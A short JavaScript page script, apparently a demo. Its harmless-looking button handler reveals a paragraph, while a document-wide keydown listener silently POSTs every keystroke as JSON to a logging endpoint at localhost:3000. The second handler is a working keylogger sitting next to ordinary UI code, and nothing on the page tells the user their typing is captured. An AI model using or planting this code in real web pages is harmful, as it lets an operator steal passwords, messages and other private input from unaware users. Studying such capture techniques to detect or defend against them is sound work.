const button = document.querySelector("button");

button.addEventListener("click", function () {
  document.querySelector("p").style.display = "block";
});

document.addEventListener("keydown", (event) => {
  // send even.key on the body of the request
  fetch("http://localhost:3000/log", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ key: event.key }),
  });
});
